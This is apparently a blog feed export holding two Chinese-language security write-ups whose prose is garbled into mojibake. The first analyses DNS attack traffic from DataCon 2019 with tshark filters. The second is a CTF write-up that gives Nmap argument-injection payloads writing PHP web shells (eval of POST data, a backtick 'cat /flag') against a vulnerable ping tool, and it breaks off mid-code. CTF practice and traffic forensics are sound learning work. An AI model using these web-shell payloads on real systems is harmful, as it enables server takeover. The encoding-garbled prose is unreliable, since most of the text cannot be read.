é€šè¿‡æ”»å‡»ç‰¹å¾å¯ä»¥å¾—å‡ºç­›é€‰æ¡ä»¶<code>dns.flags.response == 0 &amp;&amp; dns.flags.recdesired == 1 &amp;&amp; dns.qry.type == 255 &amp;&amp; dns.rr.udp_payload_size &gt;= 3000</code>ï¼Œå†å¯¹ç­›é€‰åçš„IPåœ°å€è¿›è¡Œç»Ÿè®¡ï¼š<code>tshark -r q1_final.pcap -Y &quot;dns.flags.recdesired==1 &amp;&amp; dns.flags.response==0 &amp;&amp; dns.rr.udp_payload_size&gt;=3000 &amp;&amp; dns.qry.type==255&quot; -T fields -e ip.src -e ip.dst | sort | uniq -c| sort -nr|more</code><br>
<img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4v0zdtr9lj20u4092113.jpg" alt=""><br>
è¿™æ ·å°±è¿‡æ»¤å‡ºäº† DNS æœåŠ¡å“åº”æ•°æ®äº†ï¼Œä¸€å…±æœ‰188.141.167.218ï¼Œ187.199.129.12ï¼Œ70.85.232.160ï¼Œ45.80.170.1å››ä¸ªDNSæœåŠ¡å™¨ï¼Œæ¥ç€æ’é™¤ä¸æ”¯æŒ <strong>ANY</strong> çš„ DNS æœåŠ¡å™¨ï¼Œä¹Ÿå°±æ˜¯ Refusedï¼š</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4v2thmc2lj20rm0a2acr.jpg" alt=""></p>
<p>æ’æŸ¥ä¹‹åï¼Œå¯çŸ¥æ”»å‡»IPï¼ˆä¹Ÿå°±æ˜¯æ’é™¤ç›®çš„IPä¸º45.80.170.1çš„æºIPï¼‰ï¼š127.130.104.152ï¼Œ175.222.102.169ï¼Œ105.191.150.205ã€‚</p>
</li>
</ul>
<h3 id="éæ³•DNS-åŠ¨æ€æ›´æ–°æ”»å‡»">éæ³•DNS åŠ¨æ€æ›´æ–°æ”»å‡»</h3>
<ul>
<li>
<p>æ”»å‡»åŸç†</p>
<p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc771255(v=ws.11)">è¿™é‡Œ</a>å¯¹DNS Dynamic Updateæœ‰æ¯”è¾ƒè¯¦ç»†çš„ä»‹ç»ã€‚ç®€å•åœ°æ¥è¯´ï¼ŒDNS å®¢æˆ·ç«¯åœ¨ IP åœ°å€æˆ–åç§°å‡ºç°æ›´æ”¹çš„ä»»ä½•æ—¶å€™éƒ½å¯åˆ©ç”¨ DNS æœåŠ¡å™¨æ¥æ³¨å†Œå’ŒåŠ¨æ€æ›´æ–°å…¶èµ„æºè®°å½•ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ IP æ¬ºéª—ä¼ªè£…æˆ DNS æœåŠ¡å™¨ä¿¡ä»»çš„ä¸»æœºå¯¹åŒºæ•°æ®è¿›è¡Œæ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢ã€‚</p>
</li>
<li>
<p>æ”»å‡»ç‰¹å¾ï¼š</p>
<ul>
<li><code>dns.flags.opt==5</code>æ˜¾ç¤ºDNSåŠ¨æ€æ›´æ–°æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSåŠ¨æ€æ›´æ–°å“åº”æ¶ˆæ¯</li>
</ul>
</li>
<li>
<p>å‘ç°è¿‡ç¨‹</p>
<p>ä½¿ç”¨tsharkå‘½ä»¤ç­›é€‰ï¼š<code>tshark -r q1_final.pcap -Y &quot;dns.flags.opcode==5 &amp;&amp; dns.flags.response==0&quot; -T fields -e ip.src -e ip.dst | sort | uniq -c | sort -nr|more </code></p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4v5ml7ag3j20u1034wgx.jpg" alt=""></p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4v5m8avcnj20u103lwhb.jpg" alt=""></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œæœ‰å››ä¸ªæ”»å‡»IPï¼š19.220.251.87 414ï¼Œ200.152.141.106 15ï¼Œ18.100.48.86 4091ï¼Œ237.205.156.233 535</p>
</li>
</ul>
<h3 id="éæ³•DNSåŸŸä¼ è¾“æ”»å‡»">éæ³•DNSåŸŸä¼ è¾“æ”»å‡»</h3>
<ul>
<li>
<p>æ”»å‡»åŸç†</p>
<p>è¾… DNS æœåŠ¡å™¨ï¼Œéœ€è¦ä¸ä¸» DNS æœåŠ¡å™¨è¿›è¡Œé€šä¿¡ï¼ŒåŠ è½½æ•°æ®ä¿¡æ¯ï¼Œç§°ä¸ºåŒºåŸŸä¼ é€ï¼ˆZone Transferï¼‰ã€‚AXFR è¯·æ±‚ï¼Œå¸¸å¯¼è‡´å…¨åŒºåŸŸä¼ é€ï¼Œéœ€è¦èŠ±è´¹å¤§é‡çš„æ—¶é—´ä¸å¸¦å®½ã€‚</p>
<p>å¤§é‡çš„ AXFR ã€IXFRè¯·æ±‚ï¼Œå¯å¯¼è‡´ DDoSã€‚æƒé™é…ç½®ä¸å½“ï¼Œå¯å¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼ˆæµ‹è¯•åŸŸåã€å†…éƒ¨åŸŸåï¼‰ã€‚</p>
</li>
<li>
<p>æ”»å‡»ç‰¹å¾</p>
<p><code>dns.flags.repsonse==0 &amp;&amp; dns.qry.type==252 || dns.qry.type==251</code></p>
</li>
<li>
<p>å‘ç°è¿‡ç¨‹</p>
<p>æˆ‘ä»¬ç”¨è¿‡æ»¤å™¨<code>dns.qry.type in &#123;251 252&#125;</code>æŠŠAXFRå’ŒIXFRè¿‡æ»¤å‡ºæ¥ï¼ŒæŸ¥çœ‹æœ‰å“ªäº›ç–‘ä¼¼æ”»å‡»IP</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4xcp6egw1j20u602n76f.jpg" alt=""></p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4xcpjs2jmj20u1025abs.jpg" alt=""></p>
<p>æœ‰ä¸¤ä¸ª221.223.19.169 å’Œä¸€ä¸ª129.191.74.107 å‘æ¥çš„åŸŸä¼ é€è¯·æ±‚åŒ…ï¼Œä»¥åŠå¤§é‡çš„96.199.230.176 å‘æ¥çš„åŸŸä¼ é€è¯·æ±‚åŒ…ã€‚ä»”ç»†æ£€æŸ¥ä¸€ä¸‹å‰ä¸¤ä¸ªIPåœ°å€çš„æ•°æ®åŒ…åï¼Œæˆ‘ä»¬è®¤ä¸ºå‰é¢ä¸¤ä¸ªæœ‰å¯èƒ½æ˜¯ç®¡ç†å‘˜é…ç½®ä¸å½“ç­‰é€ æˆçš„ï¼Œ<br>
è€Œæœ€åçš„ä¸€ä¸ªå¤§é‡çš„è¯·æ±‚æ•°æ®åŒ…æ˜¾ç„¶å°±æ˜¯åŸŸä¼ é€æ”»å‡»äº†ã€‚</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4xg9i185aj210q0fsq4l.jpg" alt=""></p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4xgkoujpxj20pn0cldgg.jpg" alt=""></p>
</li>
</ul>
<h3 id="DNSSec-NSec-åŸŸåéå†æ”»å‡»">DNSSec NSec åŸŸåéå†æ”»å‡»</h3>
<ul>
<li>
<p>æ”»å‡»åŸç†</p>
<p><a href="https://www.cloudxns.net/Support/detail/id/1309.html">DNSSecçš„æ¦‚å¿µä¸ä½œç”¨</a></p>
<p><a href="https://info.menandmice.com/blog/bid/73645/Take-your-DNSSEC-with-a-grain-of-salt">NSECï¼šWalking a DNS zone</a></p>
<p>NSECæšä¸¾è¿™æ˜¯é’ˆå¯¹DNSSECçš„ä¸€ç§æ”»å‡»ï¼Œåœ¨æœªä½¿ç”¨NSEC3çš„DNSSECä¸­ï¼Œè‹¥æŸ¥è¯¢åŒºæ–‡ä»¶ä¸­ä¸å­˜åœ¨çš„åŸŸåï¼Œä¼šä»¥NSECè®°å½•çš„å½¢å¼æä¾›é è¿‘å…¶çš„æœ€è¿‘çš„ä¸‹ä¸€æ¡åŸŸåï¼Œè¿™å°±é€ æˆäº†å¯èƒ½æ„é€ ç‰¹æ®Šè¯·æ±‚ï¼Œæ¥éå†åŒºæ–‡ä»¶ï¼Œé€ æˆåŒºæ–‡ä»¶çš„æ³„éœ²ã€‚</p>
</li>
<li>
<p>æ”»å‡»ç‰¹å¾</p>
<p>åŸŸåéå†æ”»å‡»ä¾èµ–äºNSecèµ„æºè®°å½•ç±»å‹ï¼Œå¯ä»¥ä½¿ç”¨``dns.resp.type==47`è¿›è¡Œåˆæ­¥ç­›é€‰</p>
</li>
<li>
<p>å‘ç°è¿‡ç¨‹</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4zkhyihryj210q0exwgu.jpg" alt=""></p>
<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æŠŠANYåå°„å‹Dosæ”»å‡»ä¹Ÿç­›é€‰å‡ºæ¥äº†ï¼Œäºæ˜¯å†åŠ ä¸Š<code>not dns.qry.type==255</code>æ¡ä»¶å°±å¯ä»¥å¾—åˆ°DNSSec NSec åŸŸåéå†æ”»å‡»IPï¼š6.116.183.244</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4zjhnxh23j210s0etmzh.jpg" alt=""></p>
</li>
</ul>
<h2 id="Q-A">Q&amp;A</h2>
<ol>
<li>
<h5 id="pacpåŒ…æ–‡ä»¶è¿‡å¤§ï¼ŒWiresharkåŠ è½½å¤±è´¥">pacpåŒ…æ–‡ä»¶è¿‡å¤§ï¼ŒWiresharkåŠ è½½å¤±è´¥</h5>
<p>è§£å†³åŠæ³•ï¼šä½¿ç”¨ <code>editcap -c &lt;packets per file&gt; åŸå§‹æ–‡ä»¶.pcap è¾“å‡ºæ–‡ä»¶.pcap</code> å‘½ä»¤ï¼›æˆ–è€…ä½¿ç”¨<code>tcpdump -r old_file -w new_files -C 10</code>ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæ¯ä¸ªæ–‡ä»¶çš„å¤§å°æ˜¯10 millionå­—èŠ‚ã€‚</p>
</li>
<li>
<h5 id="bashç®¡é“æ ¼å¼åŒ–è¾“å‡ºå‘½ä»¤">bashç®¡é“æ ¼å¼åŒ–è¾“å‡ºå‘½ä»¤</h5>
<ul>
<li><a href="https://blog.csdn.net/u010003835/article/details/80752797">tr</a></li>
<li><a href="https://www.jianshu.com/p/291632a11ede">sort -nc</a></li>
<li><a href="https://blog.csdn.net/u014756827/article/details/78949924">sort | uniq -c</a></li>
<li><a href="https://www.cnblogs.com/xiaoleiel/p/8349487.html">awk</a></li>
<li><a href="https://www.runoob.com/linux/linux-comm-more.html">more</a></li>
<li><a href="https://www.cnblogs.com/blogoflee/archive/2012/02/10/2344939.html">wc</a></li>
</ul>
</li>
<li>
<h5 id="å‡ ä¸ªç»å¸¸ç”¨åˆ°çš„DNSæ˜¾ç¤ºè¿‡æ»¤å™¨çš„å®ä¾‹">å‡ ä¸ªç»å¸¸ç”¨åˆ°çš„DNSæ˜¾ç¤ºè¿‡æ»¤å™¨çš„å®ä¾‹</h5>
<ul>
<li><code>dns.flags.response=0</code>(DNSæŸ¥è¯¢æ¶ˆæ¯)</li>
<li><code>dns.flags.response=1</code>(DNSå“åº”æ¶ˆæ¯)</li>
<li><code>dns.flags.rcode=0</code>(æ˜¾ç¤ºRCODEå­—æ®µå€¼ä¸º0(Noerror)çš„DNSåº”ç­”æ¶ˆæ¯)</li>
<li><code>dns.flags.rcode=3</code>(æ˜¾ç¤ºRCODEå­—æ®µå€¼ä¸º3(NXDomain,è¡¨ç¤ºåŸŸåä¸å­˜åœ¨)çš„DNSåº”ç­”æ¶ˆæ¯)</li>
<li><code>dns.flags.opcode=0</code>(æ˜¾ç¤ºDNSå¸¸è§„æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSå“åº”æ¶ˆæ¯)</li>
<li><code>dns.flags.opcode=1</code>(æ˜¾ç¤ºDNSé€†å‘æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSå“åº”æ¶ˆæ¯)</li>
<li><code>dns.flags.opcode=2</code>(æ˜¾ç¤ºDNSæœåŠ¡å™¨çŠ¶æ€è¯·æ±‚æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSæœåŠ¡å™¨çŠ¶æ€å“åº”æ¶ˆæ¯)</li>
<li><code>dns.flags.opcode=5</code>(æ˜¾ç¤ºDNSåŠ¨æ€æ›´æ–°æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSåŠ¨æ€æ›´æ–°å“åº”æ¶ˆæ¯)</li>
<li><code>dns.flags.recdesired=1</code>(RDæ ‡è®°ä½ç½®1çš„DNSæŸ¥è¯¢æ¶ˆæ¯ä¸€èˆ¬ä¸ºä¸»æœºå‘å‡ºï¼Œç›®çš„æ˜¯è¦æ±‚æ¥å—è¯¥æ¶ˆæ¯çš„DNSæœåŠ¡å™¨æ‰§è¡Œé€’å½’æŸ¥è¯¢)</li>
<li><code>dns.flags.recdesired=0</code>(æ˜¾ç¤ºRDæ ‡è®°ä½ç½®0çš„DNSé€’å½’åå¤æŸ¥è¯¢åŠå“åº”æ¶ˆæ¯)</li>
</ul>
</li>
<li>
<h5 id="å¸¸ç”¨çš„æŸ¥è¯¢å­—æ®µ">å¸¸ç”¨çš„æŸ¥è¯¢å­—æ®µ</h5>
<table>
<thead>
<tr>
<th>å­—æ®µ</th>
<th>æè¿°</th>
<th>å­—æ®µ</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td>frame.len</td>
<td>æ•°æ®é•¿åº¦</td>
<td>dns.flags.authenticated</td>
<td>æœåŠ¡å™¨æ˜¯å¦ä¸ºåŸŸæƒå¨æœåŠ¡å™¨</td>
</tr>
<tr>
<td>ip.src</td>
<td>æºIP</td>
<td>dns.flags.checkisable</td>
<td>éè®¤è¯æ•°æ®æ˜¯å¦å¯æ¥æ”¶</td>
</tr>
<tr>
<td>ip.dst</td>
<td>ç›®çš„IP</td>
<td>dns.flags.rcode</td>
<td>DNS reply code</td>
</tr>
<tr>
<td>udp.srcport</td>
<td>æºudpç«¯å£å·</td>
<td>dns.count.quires</td>
<td>æ•°æ®åŒ…ä¸­DNSè¯·æ±‚æ•°</td>
</tr>
<tr>
<td>udp.dstport</td>
<td>ç›®çš„udpç«¯å£å·</td>
<td>dns.count.answers</td>
<td>æ•°æ®åŒ…ä¸­DNSå›ç­”æ•°</td>
</tr>
<tr>
<td>eth.src</td>
<td>æºMACåœ°å€</td>
<td>dns.count.auth_rr</td>
<td>æ•°æ®åŒ…ä¸­æƒå¨è®°å½•æ•°</td>
</tr>
<tr>
<td>eth.dst</td>
<td>ç›®çš„MACåœ°å€</td>
<td>dns.count.add_rr</td>
<td>æ•°æ®åŒ…ä¸­é¢å¤–è®°å½•æ•°</td>
</tr>
<tr>
<td><a href="http://dns.id">dns.id</a></td>
<td>DNS Transaction ID</td>
<td><a href="http://dns.qry.name">dns.qry.name</a></td>
<td>DNSè¯·æ±‚å</td>
</tr>
<tr>
<td>dns.flags.response</td>
<td>DNSè¯·æ±‚/ç°æœ‰å“åº”æ ‡å¿—</td>
<td>dns.qry.class</td>
<td>DNSè¯·æ±‚ç±»å‹</td>
</tr>
<tr>
<td>dns.flags.opcode</td>
<td>DNS opcode</td>
<td><a href="http://dns.resp.name">dns.resp.name</a></td>
<td>DNSå“åº”å</td>
</tr>
<tr>
<td>dns.flags.authoritative</td>
<td>åº”ç­”æ˜¯å¦è¢«æœåŠ¡å™¨è®¤è¯</td>
<td>dns.resp.type</td>
<td>DNSå›å¤ç±»å‹</td>
</tr>
<tr>
<td>dns.flags.truncated</td>
<td>æ¶ˆæ¯æ˜¯å¦è¢«æˆªæ–­</td>
<td>dns.resp.ttl</td>
<td>DNSå“åº”ç”Ÿå­˜æ—¶é—´</td>
</tr>
<tr>
<td>dns.flags.recdesired</td>
<td>æ˜¯å¦é€’å½’æŸ¥è¯¢</td>
<td><a href="http://dns.resp.z.do">dns.resp.z.do</a></td>
<td>DNSæ˜¯å¦æ”¯æŒDNSSEC</td>
</tr>
<tr>
<td>dns.flags.reavail</td>
<td>æœåŠ¡å™¨æ˜¯å¦èƒ½é€’å½’æŸ¥è¯¢</td>
<td>frame.time_relative</td>
<td>frameç›¸å¯¹æ—¶é—´</td>
</tr>
</tbody>
</table>
</li>
<li>
<h5 id="å¸¸ç”¨æŸ¥è¯¢å­—æ®µç±»å‹">å¸¸ç”¨æŸ¥è¯¢å­—æ®µç±»å‹</h5>
<table>
<thead>
<tr>
<th>TYPE</th>
<th>å€¼</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>A</td>
<td>1</td>
<td>ä¸»æœºåœ°å€</td>
</tr>
<tr>
<td>NS</td>
<td>2</td>
<td>æƒå¨æœåŠ¡å™¨</td>
</tr>
<tr>
<td>CNAME</td>
<td>5</td>
<td>åˆ«åçš„æ­£åˆ™åç§°</td>
</tr>
<tr>
<td>SOA</td>
<td>6</td>
<td>æ ‡è®°æƒå¨åŒºåŸŸçš„å¼€å§‹</td>
</tr>
<tr>
<td>PTR</td>
<td>12</td>
<td>åŸŸåæŒ‡é’ˆ</td>
</tr>
<tr>
<td>MX</td>
<td>15</td>
<td>é‚®ä»¶äº¤æ¢</td>
</tr>
<tr>
<td>TXT</td>
<td>16</td>
<td>æ–‡æœ¬å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td>DS</td>
<td>43</td>
<td>å§”æ‰˜ç­¾å‘è€…</td>
</tr>
<tr>
<td>IXFR</td>
<td>251</td>
<td>å¢é‡åŒºåŸŸè½¬ç§»</td>
</tr>
<tr>
<td>AXFR</td>
<td>252</td>
<td>æƒå¨åŒºåŸŸè½¬ç§»</td>
</tr>
<tr>
<td>*</td>
<td>255</td>
<td>æ‰€æœ‰è§£æè®°å½•ï¼Œä¹Ÿæˆä¸ºANY</td>
</tr>
</tbody>
</table>
</li>
</ol>
<h2 id="æ€»ç»“ä¸åæ€">æ€»ç»“ä¸åæ€</h2>
<p>çœ‹äº†å¾ˆå¤šå¤§ä½¬ä»¬å†™çš„Writeupï¼Œç…§è‘«èŠ¦ç”»ç“¢å¤ç°äº†DNSæ¶æ„æµé‡åˆ†æï¼ŒæœŸé—´é‡åˆ°äº†ä¸å°‘çš„å›°éš¾ï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li>å¯¹DNSåè®®äº†è§£å¾ˆå°‘</li>
<li>æ•°æ®åŒ…éå¸¸å¤§ï¼Œæ²¡æœ‰æ”»å‡»æµé‡çš„æ ‡æ³¨</li>
<li>å¯¹æµé‡åˆ†æåŸºæœ¬æ˜¯é›¶èµ·æ­¥ï¼Œä¸çŸ¥é“è¯¥ä»å“ªé‡Œå¼€å§‹åˆ†æï¼Œæ²¡æœ‰ä¸€ä¸ªåˆç†çš„é€»è¾‘æ€ç»´</li>
</ul>
<p>ç»è¿‡è¿™ä¸€è½®çš„å¤ç°ä¹‹åï¼Œå¯ä»¥è¯´å¯¹æµé‡åˆ†ææœ‰äº†ä¸€å®šçš„äº†è§£ï¼ŒçŸ¥é“äº†ä¸€äº›DNSçš„æ”»å‡»æ‰‹æ®µä»¥åŠæ”»å‡»ç‰¹å¾ï¼Œè¿˜æœ‰è‹¥å¹²éå¸¸å®ç”¨çš„æ–‡ä»¶å¤„ç†å‘½ä»¤ã€‚ä½†æ˜¯ï¼Œä¾ç„¶å­˜åœ¨å¾ˆå¤šä¸è¶³ï¼Œæ‰€ä»¥æ‰“ç®—ä»¥<a href="https://github.com/shyoshyo/DataCon-9102-DNS">shyoshyo</a>æ’°å†™çš„Writeupä¸ºæ¨¡æ¿ï¼Œæœ‰æ¡ç†ã€æœ‰é€»è¾‘çš„è¿›è¡Œç¬¬äºŒè½®æµé‡åˆ†æã€‚</p>
]]></content>
      <categories>
        <category>æµé‡åˆ†æ</category>
        <category>æ¯”èµ›é¢˜</category>
      </categories>
      <tags>
        <tag>Wireshark</tag>
        <tag>æµé‡åˆ†æ</tag>
        <tag>DNS</tag>
        <tag>Datacon2019</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctfåˆ·é¢˜â€”â€”å‘½ä»¤æ‰§è¡Œ</title>
    <url>/Web_security/ctf_writeup/10.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h2 id="GXYCTF2019-Ping-Ping-Ping">GXYCTF2019 Ping Ping Ping</h2>
<h3 id="TODO">TODO</h3>
<h2 id="ACTF2020-æ–°ç”Ÿèµ›-Exec">ACTF2020 æ–°ç”Ÿèµ› Exec</h2>
<h3 id="TODO-v2">TODO</h3>
<h2 id="BUUCTF2018-Online-Tool">BUUCTF2018 Online Tool</h2>
<h3 id="è€ƒç‚¹">è€ƒç‚¹</h3>
<ul>
<li>Nmapå‚æ•°æ³¨å…¥</li>
</ul>
<h3 id="è§£é¢˜">è§£é¢˜</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">&quot;glzjin&quot;</span>. $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å‚è€ƒä¹‹å‰å­¦ä¹ PHPä»£ç å®¡è®¡çš„<a href="https://ca0y1h.top/code_audit/7.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day5/#PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0Day5%E2%80%94%E2%80%94escapeshellarg%E4%B8%8Eescapeshellcmd%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93">ä¸€ç¯‡æ–‡ç« </a>ï¼Œescapeshellargå‡½æ•°å’Œescapeshellcmdå‡½æ•°åŒæ—¶ä½¿ç”¨ä¼šå¯¼è‡´å•å¼•å·é€ƒé€¸ã€‚</p>
<p>æµ‹è¯•ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$host = <span class="string">&quot;&#x27; &lt;?php phpinfo();?&gt; -oN shell.php &#x27;&quot;</span>;</span><br><span class="line">$host = (<span class="keyword">string</span>)$host;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;host:&quot;</span>.$host;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$arg = escapeshellarg($host);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;arg:&quot;</span>.$arg;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$cmd = escapeshellcmd($arg);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;cmd:&quot;</span>.$cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¯¹äºå•ä¸ªå•å¼•å·, escapeshellarg()å‡½æ•°è½¬ä¹‰å,è¿˜ä¼šåœ¨å·¦å³å„åŠ ä¸€ä¸ªå•å¼•å·,ä½†escapeshellcmd()å‡½æ•°æ˜¯ç›´æ¥åŠ ä¸€ä¸ªè½¬ä¹‰ç¬¦ã€‚<br>
å¯¹äºæˆå¯¹çš„å•å¼•å·, escapeshellcmd()å‡½æ•°é»˜è®¤ä¸è½¬ä¹‰,ä½†escapeshellarg()å‡½æ•°è½¬ä¹‰ã€‚<br>
hostå‚æ•°å…ˆç»è¿‡escapeshellarg()å†ç»è¿‡escapeshellcmd()å°±ä¼šå‡ºç°é—®é¢˜ã€‚<br>
escapeshellarg å…ˆè½¬ä¹‰äº†ä¸€ä¸ªå•å¼•å·,ç„¶åå¼•å…¥äº†ä¸€å¯¹å•å¼•å·, escapeshellcmd ä¸ä¼šè½¬ä¹‰æˆå¯¹çš„å•å¼•å·,ä½†æ˜¯ä¼šè½¬ä¹‰è½¬ç§»ç¬¦<code>\</code>ï¼Œè¿™æ ·, è½¬ç§»ç¬¦ä½œç”¨å¤±æ•ˆ,é€ƒé€¸å‡ºæ¥ä¸€ä¸ªå•å¼•å·ã€‚</p>
<p>payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?host&#x3D;&#39; &lt;?php &#96;cat &#x2F;flag&#96;;?&gt; -oN shell.php &#39;</span><br></pre></td></tr></table></figure>
<h2 id="ç½‘é¼æ¯2020-æœ±é›€ç»„-Nmap">ç½‘é¼æ¯2020 æœ±é›€ç»„ Nmap</h2>
<h3 id="è€ƒç‚¹-v2">è€ƒç‚¹</h3>
<ul>
<li>Nmapå‚æ•°æ³¨å…¥</li>
</ul>
<h3 id="è§£é¢˜-v2">è§£é¢˜</h3>
<p>å’Œä¸Šé¢ä¸€é“é¢˜æ¯”è¾ƒåƒäº†ï¼Œéƒ½æ˜¯è€ƒå¯ŸNmapå‚æ•°æ³¨å…¥ï¼Œä½†æ˜¯æ²¡æœ‰æ˜¾ç¤ºæºç ã€‚</p>
<p>ç›´æ¥ç”¨Online Toolçš„payloadè¿›è¡Œæµ‹è¯•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</span><br></pre></td></tr></table></figure>
<p>æç¤ºhackerï¼ŒFuzzä¹‹åå‘ç°åº”è¯¥æ˜¯è¿‡æ»¤PHPå…³é”®å­—ï¼Œæ”¹ç”¨çŸ­æ ‡ç­¾å’Œphtmlåç¼€ç»•è¿‡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; &lt;?&#x3D;@eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &#39;</span><br></pre></td></tr></table></figure>
<p>æ²¡æœ‰æç¤ºå…¶ä»–é»‘åå•ä¿¡æ¯ï¼Œè®¿é—®å½“å‰ç›®å½•ä¸‹çš„<code>hack.phtml</code>æ–‡ä»¶å­˜åœ¨ï¼Œç”¨èšå‰‘è¿æ¥ï¼Œæ‹¿åˆ°flagã€‚</p>
<blockquote>
<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://zhuanlan.zhihu.com/p/145906109">https://zhuanlan.zhihu.com/p/145906109</a></p>
</blockquote>
<h2 id="RoarCTF2019-Easy-Calc">RoarCTF2019 Easy Calc</h2>
<h3 id="è€ƒç‚¹-v3">è€ƒç‚¹</h3>
<ul>
<li>ä»£ç å®¡è®¡</li>
<li>PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§Bypassï¼š<a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></li>
</ul>
<h3 id="è§£é¢˜-v3">è§£é¢˜</h3>
<p>æŸ¥çœ‹æºä»£ç ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="comment">//å¯¹è¾“å…¥çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡ŒURLç¼–ç å¹¶ä»¥GETæ–¹å¼è®¿é—®è¯·æ±‚</span></span><br><span class="line">    $(<span class="string">&#x27;#calc&#x27;</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url:<span class="string">&quot;calc.php?num=&quot;</span>+<span class="built_in">encodeURIComponent</span>($(<span class="string">&quot;#content&quot;</span>).val()),      </span><br><span class="line">            type:<span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">            success:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">                $(<span class="string">&quot;#result&quot;</span>).html(<span class="string">`&lt;div class=&quot;alert alert-success&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;strong&gt;ç­”æ¡ˆ:&lt;/strong&gt;<span class="subst">$&#123;data&#125;</span></span></span><br><span class="line"><span class="string">            &lt;/div&gt;`</span>);</span><br><span class="line">            